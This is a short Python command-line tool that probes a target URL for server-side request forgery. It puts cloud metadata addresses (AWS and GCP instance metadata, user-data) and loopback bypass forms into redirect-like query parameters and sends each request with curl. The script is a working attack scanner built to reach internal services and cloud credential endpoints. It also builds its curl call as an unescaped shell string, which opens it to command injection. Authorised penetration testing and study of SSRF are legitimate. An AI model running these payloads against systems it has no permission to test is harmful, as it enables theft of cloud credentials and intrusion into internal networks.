#!/usr/bin/env python3
"""
SSRF Probe - Test for Server-Side Request Forgery
"""
import subprocess, sys, json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:22",
    "http://localhost:22",
    "http://0/",
    "http://127.1/",
    "http://2130706433/",
    "http://[::1]:80/",
    "http://localtest.me:8080/",
]

SSRF_PARAMS = ["url", "image", "img", "src", "redirect", "callback", "next", 
               "file", "load", "fetch", "link", "href", "page", "endpoint",
               "return", "dest", "destination", "continue", "view", "path"]

def probe_ssrf(url):
    findings = []
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    
    if not query_params:
        return findings
    
    for param in query_params:
        if any(ssrf_param in param.lower() for ssrf_param in SSRF_PARAMS):
            for payload in SSRF_PAYLOADS:
                new_params = query_params.copy()
                new_params[param] = [payload]
                new_query = urlencode(new_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                try:
                    r = subprocess.run(
                        f"curl -sk -o /dev/null -w '%{{http_code}}' '{test_url}'",
                        shell=True, capture_output=True, text=True, timeout=15
                    )
                    if r.stdout.strip() in ["200", "301", "302"]:
                        findings.append({
                            "type": "SSRF",
                            "param": param,
                            "payload": payload,
                            "url": test_url,
                            "status": r.stdout.strip(),
                            "details": "Check response for cloud metadata or internal service data"
                        })
                except:
                    pass
    
    return findings

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ssrf_probe.py <url>")
        sys.exit(1)
    findings = probe_ssrf(sys.argv[1])
    if findings:
        print(f"Found {len(findings)} potential SSRF(s):")
        for f in findings:
            print(f"  [{f['param']}] {f['payload']} -> {f['status']}")
    else:
        print("No obvious SSRF found")
